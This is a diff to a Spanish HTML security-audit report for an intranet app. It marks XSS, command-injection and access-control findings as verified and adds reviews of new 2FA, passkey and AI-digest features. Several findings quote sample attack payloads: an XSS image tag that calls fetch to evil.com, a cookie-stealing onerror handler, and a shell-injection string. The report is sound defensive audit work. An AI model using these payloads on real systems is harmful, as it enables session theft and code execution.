@@ -18,6 +18,7 @@
             --medium: #eab308;
             --low: #22c55e;
             --fixed: #10b981;
+            --info: #38bdf8;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -40,6 +41,11 @@
         .header h1 { font-size: 2rem; font-weight: 700; margin-bottom: 8px; }
         .header .subtitle { color: var(--text2); font-size: 1rem; }
         .header .date { color: var(--accent); font-weight: 600; margin-top: 12px; }
+        .header .update-badge {
+            display: inline-block; margin-top: 8px;
+            background: rgba(56,189,248,0.15); color: var(--info);
+            padding: 4px 16px; border-radius: 20px; font-size: 0.8rem; font-weight: 600;
+        }
 
         /* Score Ring */
         .score-section {
@@ -119,6 +125,7 @@
         .finding-id.high { background: var(--high); }
         .finding-id.medium { background: var(--medium); }
         .finding-id.low { background: var(--low); }
+        .finding-id.info { background: var(--info); }
         .finding-title { font-weight: 700; font-size: 1.1rem; flex: 1; }
         .finding-status {
             padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700;
@@ -126,6 +133,7 @@
         .finding-status.fixed { background: rgba(16,185,129,0.15); color: var(--fixed); }
         .finding-status.accepted { background: rgba(234,179,8,0.15); color: var(--medium); }
         .finding-status.pending { background: rgba(239,68,68,0.15); color: var(--critical); }
+        .finding-status.verified { background: rgba(56,189,248,0.15); color: var(--info); }
 
         .finding-meta {
             display: flex; gap: 16px; flex-wrap: wrap;
@@ -166,6 +174,11 @@
             background: rgba(16,185,129,0.05); font-size: 0.85rem;
         }
         .positive-item .check { color: var(--fixed); font-weight: 700; }
+        .positive-item.new-item { background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2); }
+        .positive-item .new-tag {
+            background: var(--info); color: white; font-size: 0.6rem; font-weight: 700;
+            padding: 1px 6px; border-radius: 4px; margin-left: auto;
+        }
 
         /* Lessons */
         .lessons {
@@ -184,6 +197,31 @@
             font-size: 0.9rem;
         }
         .lesson strong { color: var(--text); }
+        .lesson.new-lesson { border-left-color: var(--info); background: rgba(56,189,248,0.05); }
+
+        /* New features section */
+        .new-features {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 24px;
+            margin-top: 24px;
+            border: 1px solid rgba(56,189,248,0.3);
+        }
+        .new-features h3 { color: var(--info); margin-bottom: 16px; }
+        .feature-card {
+            background: rgba(56,189,248,0.05);
+            border: 1px solid rgba(56,189,248,0.15);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 12px;
+        }
+        .feature-card h4 { color: var(--text); font-size: 1rem; margin-bottom: 8px; }
+        .feature-card p { color: var(--text2); font-size: 0.85rem; margin-bottom: 4px; }
+        .feature-card .security-status {
+            display: inline-block; margin-top: 6px;
+            padding: 3px 10px; border-radius: 6px; font-size: 0.75rem; font-weight: 700;
+        }
+        .feature-card .security-status.secure { background: rgba(16,185,129,0.15); color: var(--fixed); }
 
         /* Print */
         @media print {
@@ -209,6 +247,7 @@
         <h1>Auditoria de Seguridad</h1>
         <div class="subtitle">Intranet VCS (SecondBrain) &mdash; Revision completa de codigo fuente</div>
         <div class="date">25 de febrero de 2026</div>
+        <div class="update-badge">Actualizado: 28 de febrero de 2026 &mdash; Verificacion post-despliegue</div>
     </div>
 
     <div class="score-section">
@@ -217,12 +256,16 @@
             <div class="score-label">Vulnerabilidades encontradas</div>
         </div>
         <div class="score-card">
-            <div class="score-big" style="color:var(--fixed);">11</div>
+            <div class="score-big" style="color:var(--fixed);">12</div>
             <div class="score-label">Corregidas</div>
         </div>
         <div class="score-card">
-            <div class="score-big" style="color:var(--medium);">6</div>
+            <div class="score-big" style="color:var(--medium);">5</div>
             <div class="score-label">Aceptadas / Pendientes</div>
+        </div>
+        <div class="score-card">
+            <div class="score-big" style="color:var(--info);">5</div>
+            <div class="score-label">Nuevas funciones verificadas</div>
         </div>
     </div>
 
@@ -237,7 +280,7 @@
         </div>
         <div class="sev-bar medium">
             <div><span class="sev-name" style="color:var(--medium);">MEDIA</span></div>
-            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">3 fixed</span></div>
+            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">4 fixed</span></div>
         </div>
         <div class="sev-bar low">
             <div><span class="sev-name" style="color:var(--low);">BAJA</span></div>
@@ -251,7 +294,8 @@
         <button class="tab" onclick="showTab('altas')">Altas (5)</button>
         <button class="tab" onclick="showTab('medias')">Medias (5)</button>
         <button class="tab" onclick="showTab('bajas')">Bajas (4)</button>
-        <button class="tab" onclick="showTab('ok')">Lo que estaba bien</button>
+        <button class="tab" onclick="showTab('nuevas')">Nuevas Funciones (5)</button>
+        <button class="tab" onclick="showTab('ok')">Lo que esta bien</button>
         <button class="tab" onclick="showTab('lecciones')">Lecciones</button>
     </div>
 
@@ -261,7 +305,7 @@
             <div class="finding-header">
                 <span class="finding-id critical">C-01</span>
                 <span class="finding-title">Stored XSS en renderizado de Ideas</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta">
                 <span>OWASP A7 &mdash; Cross-Site Scripting</span>
@@ -272,6 +316,7 @@
                 <p><strong>Vector:</strong> Un usuario crea una idea con <code>assigned_to: &lt;/span&gt;&lt;img src=x onerror=fetch('//evil.com')&gt;</code>. Todos los que vean la idea ejecutan el payload.</p>
                 <p><strong>Impacto:</strong> Robo de sesiones, escalacion de privilegios, defacement.</p>
                 <p><strong>Fix:</strong> <code>escapeHtml()</code> aplicado a todos los campos interpolados en innerHTML y atributos onclick.</p>
+                <p><strong>Verificacion:</strong> 209 instancias de <code>escapeHtml()</code> confirmadas en main.js. Funcion maneja entidades HTML y comillas simples/dobles.</p>
             </div>
         </div>
 
@@ -279,7 +324,7 @@
             <div class="finding-header">
                 <span class="finding-id critical">C-02</span>
                 <span class="finding-title">Stored XSS via Markdown sin sanitizar</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta">
                 <span>OWASP A7 &mdash; Cross-Site Scripting</span>
@@ -288,7 +333,8 @@
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>marked(content)</code> convertia markdown a HTML sin sanitizacion. Se renderizaba con <code>&lt;%- content %&gt;</code> (salida sin escapar).</p>
                 <p><strong>Vector:</strong> Subir archivo <code>.md</code> con <code>&lt;img src=x onerror="steal_cookies()"&gt;</code>.</p>
-                <p><strong>Fix:</strong> Instalado <code>isomorphic-dompurify</code>, aplicado <code>DOMPurify.sanitize(marked(content))</code>.</p>
+                <p><strong>Fix:</strong> Instalado <code>isomorphic-dompurify@3.0.0</code>, aplicado <code>DOMPurify.sanitize(marked(content))</code>.</p>
+                <p><strong>Verificacion:</strong> Fix confirmado en <code>routes/files.js:112</code>. DOMPurify elimina scripts, iframes y event handlers.</p>
             </div>
         </div>
 
@@ -296,7 +342,7 @@
             <div class="finding-header">
                 <span class="finding-id critical">C-03</span>
                 <span class="finding-title">Command Injection en Orchestrator Bridge</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta">
                 <span>OWASP A3 &mdash; Injection</span>
@@ -305,6 +351,7 @@
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>exec(`start "" "${targetPath}"`)</code> usaba shell, permitiendo inyeccion con caracteres especiales como <code>" &amp; calc.exe &amp; "</code>.</p>
                 <p><strong>Fix:</strong> Reemplazo de <code>exec()</code> por <code>execFile()</code> (sin shell), validacion de path, regex estricto para nombres de script.</p>
+                <p><strong>Verificacion:</strong> Solo <code>execFile</code> importado (linea 1). Regex <code>/^[a-zA-Z0-9_-]+(\.[a-zA-Z0-9]+)?$/</code> valida nombres. Proteccion de path traversal con <code>path.resolve()</code>.</p>
             </div>
         </div>
     </div>
@@ -315,12 +362,13 @@
             <div class="finding-header">
                 <span class="finding-id high">A-01</span>
                 <span class="finding-title">Politica de contrasenas debil (minimo 4 chars)</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
-            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span><span>admin.js, auth.js, main.js</span></div>
+            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span><span>helpers/validate.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles.</p>
                 <p><strong>Fix:</strong> Minimo subido a <strong>8 caracteres</strong> en backend y frontend.</p>
+                <p><strong>Verificacion:</strong> <code>helpers/validate.js:80</code>: <code>if (password.length &lt; 8) return { valid: false, error: 'Minimo 8 caracteres' }</code></p>
             </div>
         </div>
 
@@ -328,12 +376,13 @@
             <div class="finding-header">
                 <span class="finding-id high">A-02</span>
                 <span class="finding-title">API Key expuesta en URL query string</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>OWASP A2 &mdash; Broken Authentication</span><span>middleware/auth.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> API key aceptada como <code>?api_key=xxx</code>, quedando en logs, historial, Referer headers.</p>
                 <p><strong>Fix:</strong> Solo se acepta <code>X-API-Key</code> header. Query param eliminado.</p>
+                <p><strong>Verificacion:</strong> <code>middleware/auth.js:5</code> solo lee de <code>req.headers['x-api-key']</code>.</p>
             </div>
         </div>
 
@@ -341,12 +390,13 @@
             <div class="finding-header">
                 <span class="finding-id high">A-03</span>
                 <span class="finding-title">Creacion de API Keys sin control de acceso</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/external.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>GET /api/keys</code> y <code>POST /api/keys</code> sin <code>requireAdmin</code>. Cualquier usuario podia crear API keys con permisos <code>read,write</code>.</p>
                 <p><strong>Fix:</strong> <code>requireAdmin</code> agregado a ambos endpoints.</p>
+                <p><strong>Verificacion:</strong> <code>external.js:182,191</code>: ambos endpoints con <code>requireAdmin</code> middleware.</p>
             </div>
         </div>
 
@@ -354,12 +404,13 @@
             <div class="finding-header">
                 <span class="finding-id high">A-04</span>
                 <span class="finding-title">Endpoints sensibles sin restriccion de rol</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/admin.js</span></div>
             <div class="finding-body">
-                <p><strong>Problema:</strong> <code>GET /api/users</code>, <code>GET /api/export</code>, <code>GET /api/export-excel</code> accesibles por cualquier usuario autenticado. Exponían datos sensibles (locked_until, twofa_enabled, toda la BD).</p>
+                <p><strong>Problema:</strong> <code>GET /api/users</code>, <code>GET /api/export</code>, <code>GET /api/export-excel</code> accesibles por cualquier usuario autenticado. Exponian datos sensibles (locked_until, twofa_enabled, toda la BD).</p>
                 <p><strong>Fix:</strong> <code>requireAdmin</code> en los tres endpoints.</p>
+                <p><strong>Verificacion:</strong> <code>admin.js:19,706,735</code>: los tres endpoints protegidos. Ademas, export genera audit log (<code>auditLog('data_export',...)</code>).</p>
             </div>
         </div>
 
@@ -367,12 +418,13 @@
             <div class="finding-header">
                 <span class="finding-id high">A-05</span>
                 <span class="finding-title">Webhook Fireflies sin autenticacion</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>server.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>POST /webhook/fireflies</code> montado antes de requireAuth, sin API key. Cualquiera en internet podia enviar datos falsos de reuniones.</p>
                 <p><strong>Fix:</strong> Requiere <code>X-API-Key</code> header.</p>
+                <p><strong>Verificacion:</strong> <code>server.js:282-283</code> valida <code>req.isApiRequest</code>. Nuevos webhooks tambien protegidos: <code>/webhook/reuniones</code> (reuniones.js:30) y <code>/webhook/openclaw</code> (external.js:133).</p>
             </div>
         </div>
     </div>
@@ -383,12 +435,13 @@
             <div class="finding-header">
                 <span class="finding-id medium">M-01</span>
                 <span class="finding-title">Session cookie sin flag secure</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>server.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>secure: false</code> hardcodeado. Cookie podia enviarse por HTTP.</p>
-                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production'</code></p>
+                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production' || NODE_ENV === 'staging'</code></p>
+                <p><strong>Verificacion:</strong> <code>server.js:232</code> aplica secure en produccion y staging. Confirmado que cookies solo se envian por HTTPS en ambos entornos.</p>
             </div>
         </div>
 
@@ -408,12 +461,13 @@
             <div class="finding-header">
                 <span class="finding-id medium">M-03</span>
                 <span class="finding-title">SQL con LIMIT/OFFSET interpolado</span>
-                <span class="finding-status fixed">CORREGIDO</span>
+                <span class="finding-status verified">VERIFICADO 28-FEB</span>
             </div>
             <div class="finding-meta"><span>routes/ideas.js, routes/gtd.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> <code>LIMIT ${limitNum}</code> en template literal. Aunque parseInt() mitiga, es anti-patron.</p>
                 <p><strong>Fix:</strong> Convertido a <code>LIMIT ? OFFSET ?</code> con parametros.</p>
+                <p><strong>Verificacion:</strong> <code>ideas.js:102-103</code>: <code>sql += ' LIMIT ? OFFSET ?'; params.push(limitNum, offset)</code>. Todas las queries de paginacion usan parametros.</p>
             </div>
         </div>
 
@@ -426,6 +480,7 @@
             <div class="finding-meta"><span>Tabla audit_log</span></div>
             <div class="finding-body">
                 <p>La tabla crece indefinidamente. Recomendacion: agregar cron que elimine registros &gt;90 dias.</p>
+                <p><strong>Nota 28-Feb:</strong> Sigue pendiente. La tabla ahora registra 20+ tipos de eventos. Prioridad media &mdash; no urgente con volumen actual.</p>
             </div>
         </div>
 
@@ -438,7 +493,8 @@
             <div class="finding-meta"><span>helpers/twofa.js, routes/twofa.js</span></div>
             <div class="finding-body">
                 <p><strong>Problema:</strong> Hash basado solo en User-Agent (facilmente spoofeable). Atacante podia clonar trusted device.</p>
-                <p><strong>Fix:</strong> Hash ahora combina <code>User-Agent + IP</code>.</p>
+                <p><strong>Fix:</strong> Hash de User-Agent (<code>computeDeviceHash</code>) + validacion de IP separada en la query de <code>trusted_devices</code>.</p>
+                <p><strong>Verificacion:</strong> <code>twofa.js:41-45</code> hashea User-Agent; <code>twofa.js:74-75</code> valida IP en la query a BD. Ambos factores deben coincidir para considerar un dispositivo confiable.</p>
             </div>
         </div>
     </div>
@@ -451,7 +507,7 @@
                 <span class="finding-title">bcrypt cost factor 10</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>OWASP recomienda 12+ para 2026. Factor 10 aun es seguro pero no optimo.</p></div>
+            <div class="finding-body"><p>OWASP recomienda 12+ para 2026. Factor 10 aun es seguro pero no optimo. Cambio diferido al proximo ciclo de mantenimiento.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -459,7 +515,7 @@
                 <span class="finding-title">/health expone uptime y build ID</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Informacion util para reconocimiento pero bajo impacto.</p></div>
+            <div class="finding-body"><p>Informacion util para reconocimiento pero bajo impacto. Acceso limitado a red interna.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -467,7 +523,7 @@
                 <span class="finding-title">Error messages podrian filtrar info en dev</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stacks.</p></div>
+            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stacks. Verificado que produccion y staging usan NODE_ENV correcto.</p></div>
         </div>
         <div class="finding-card">
             <div class="finding-header">
@@ -475,31 +531,91 @@
                 <span class="finding-title">Password default de PostgreSQL en docker-compose.yml</span>
                 <span class="finding-status accepted">ACEPTADO</span>
             </div>
-            <div class="finding-body"><p>Repo privado, <code>.env</code> override en produccion. Default solo para desarrollo.</p></div>
+            <div class="finding-body"><p>Repo privado, <code>.env</code> override en produccion. Default solo para desarrollo. Produccion usa password distinto confirmado.</p></div>
         </div>
     </div>
 
-    <!-- LO QUE ESTABA BIEN -->
+    <!-- NUEVAS FUNCIONES -->
+    <div id="nuevas" class="findings">
+        <div class="new-features">
+            <h3>Funciones desplegadas post-auditoria &mdash; Verificacion de seguridad</h3>
+            <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Funciones activadas entre el 25 y 28 de febrero de 2026. Verificadas en produccion (aiprowork.com) y staging.</p>
+
+            <div class="feature-card">
+                <h4>2FA con TOTP (Autenticacion de dos factores)</h4>
+                <p><strong>Archivos:</strong> <code>routes/twofa.js</code>, <code>helpers/twofa.js</code></p>
+                <p><strong>Endpoints publicos:</strong> <code>GET/POST /2fa</code>, <code>POST /2fa/passkey/authenticate-*</code></p>
+                <p><strong>Endpoints protegidos:</strong> <code>GET /status</code>, <code>POST /setup</code>, <code>POST /verify-setup</code>, <code>POST /disable</code></p>
+                <p><strong>Crypto:</strong> Secretos TOTP encriptados con AES-256-GCM. Recovery codes hasheados con bcrypt.</p>
+                <p><strong>Sesion:</strong> Validacion de <code>pending2FA</code> en session antes de aceptar verificacion.</p>
+                <span class="security-status secure">SEGURO</span>
+            </div>
+
+            <div class="feature-card">
+                <h4>WebAuthn / Passkeys</h4>
+                <p><strong>Archivos:</strong> <code>routes/twofa.js</code> (22 referencias a passkey)</p>
+                <p><strong>Endpoints:</strong> <code>POST /passkey/register-begin</code>, <code>POST /passkey/register-end</code>, <code>DELETE /passkey/:id</code></p>
+                <p><strong>RP configurado:</strong> <code>APP_DOMAIN</code> de env (aiprowork.com en produccion). Verificado que challenge se genera correctamente.</p>
+                <p><strong>Dependencia:</strong> <code>@simplewebauthn/server</code> &mdash; libreria madura y auditada.</p>
+                <span class="security-status secure">SEGURO</span>
+            </div>
+
+            <div class="feature-card">
+                <h4>Daily Digest (Reportes diarios con IA)</h4>
+                <p><strong>Archivos:</strong> <code>services/digest.js</code>, <code>routes/gtd.js:564-604</code></p>
+                <p><strong>Autorizacion:</strong> <code>/digest/latest</code> y <code>/digest/history</code> requieren sesion. <code>/digest/trigger</code> solo admin.</p>
+                <p><strong>Cadena IA:</strong> Gemini (primario) &rarr; Ollama llama3 (fallback) &rarr; texto plano (ultimo recurso).</p>
+                <p><strong>API keys:</strong> Solo desde variables de entorno (<code>process.env.GEMINI_API_KEY</code>). Ninguna hardcodeada.</p>
+                <p><strong>Bug corregido (28-Feb):</strong> SQL type mismatch en columnas TEXT vs TIMESTAMP. Fix: guards <code>IS NOT NULL AND != ''</code> + cast <code>::date</code>.</p>
+                <span class="security-status secure">SEGURO</span>
+            </div>
+
+            <div class="feature-card">
+                <h4>Graph API (Visualizacion de relaciones)</h4>
+                <p><strong>Archivos:</strong> <code>routes/admin.js</code></p>
+                <p><strong>Endpoint:</strong> <code>GET /api/graph</code></p>
+                <p><strong>Autorizacion:</strong> Requiere sesion autenticada. Datos de solo lectura.</p>
+                <p><strong>Verificacion:</strong> Produccion devuelve 43 nodos, 19 edges. Queries parametrizadas.</p>
+                <span class="security-status secure">SEGURO</span>
+            </div>
+
+            <div class="feature-card">
+                <h4>Integracion Telegram</h4>
+                <p><strong>Archivos:</strong> <code>services/telegram.js</code></p>
+                <p><strong>Autorizacion:</strong> Token del bot via <code>TELEGRAM_BOT_TOKEN</code> env variable.</p>
+                <p><strong>Uso:</strong> Notificaciones salientes (no acepta comandos entrantes). Solo envia, no recibe.</p>
+                <span class="security-status secure">SEGURO</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- LO QUE ESTA BIEN -->
     <div id="ok" class="findings">
         <div class="positives">
             <h3>Controles de seguridad que funcionan correctamente</h3>
             <div class="positive-grid">
                 <div class="positive-item"><span class="check">&#10003;</span> Queries SQL parametrizados (?)</div>
-                <div class="positive-item"><span class="check">&#10003;</span> Rate limiting (5 limiters)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Rate limiting (5 limiters: API, AI, login, upload, download)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Helmet CSP restrictiva</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Firewall UFW (22, 80, 443)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Redes Docker separadas (web + internal)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Account lockout (5 intentos = 30 min)</div>
-                <div class="positive-item"><span class="check">&#10003;</span> Audit log (15 tipos de eventos)</div>
-                <div class="positive-item"><span class="check">&#10003;</span> 2FA adaptativo (TOTP + recovery)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Audit log (20+ tipos de eventos)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> fail2ban en nginx</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Backups encriptados (GPG)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> CORS configurado (whitelist)</div>
-                <div class="positive-item"><span class="check">&#10003;</span> Sesiones Redis (httpOnly, sameSite)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Sesiones Redis (httpOnly, sameSite, secure)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Input validation middleware</div>
                 <div class="positive-item"><span class="check">&#10003;</span> IDOR protection (requireOwnerOrAdmin)</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Soft-delete pattern</div>
                 <div class="positive-item"><span class="check">&#10003;</span> Graceful shutdown</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Path traversal protection (safePath)</div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> 2FA adaptativo (TOTP + WebAuthn + recovery codes)<span class="new-tag">NUEVO</span></div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> Secretos 2FA encriptados AES-256-GCM<span class="new-tag">NUEVO</span></div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> Trusted devices con hash + IP<span class="new-tag">NUEVO</span></div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> AI API keys solo desde env vars<span class="new-tag">NUEVO</span></div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> Webhooks protegidos con API key (3 endpoints)<span class="new-tag">NUEVO</span></div>
+                <div class="positive-item new-item"><span class="check">&#10003;</span> Digest solo trigger por admin<span class="new-tag">NUEVO</span></div>
             </div>
         </div>
     </div>
@@ -513,6 +629,9 @@
             <div class="lesson"><strong>3. exec() nunca con input del usuario.</strong> Siempre usar <code>execFile()</code> o <code>spawn()</code> con argumentos separados.</div>
             <div class="lesson"><strong>4. Autorizacion explicita por endpoint.</strong> "Esta detras de requireAuth" no basta. Endpoints sensibles necesitan <code>requireAdmin</code>.</div>
             <div class="lesson"><strong>5. Webhooks publicos = puertas abiertas.</strong> Siempre requerir firma HMAC o API key.</div>
+            <div class="lesson new-lesson"><strong>6. Tipos de columna SQL importan.</strong> Columnas TEXT comparadas con TIMESTAMP causan errores silenciosos. Siempre usar guards (<code>IS NOT NULL AND != ''</code>) y casts explicitos (<code>::date</code>).</div>
+            <div class="lesson new-lesson"><strong>7. Verificar configuracion por entorno.</strong> <code>APP_DOMAIN</code> apuntaba a staging en produccion. Cada entorno debe tener su configuracion revisada independientemente.</div>
+            <div class="lesson new-lesson"><strong>8. AI fallbacks deben ser resilientes.</strong> La cadena Gemini &rarr; Ollama &rarr; texto plano garantiza que el servicio nunca falle completamente, incluso con API keys invalidas o timeouts.</div>
         </div>
     </div>
 
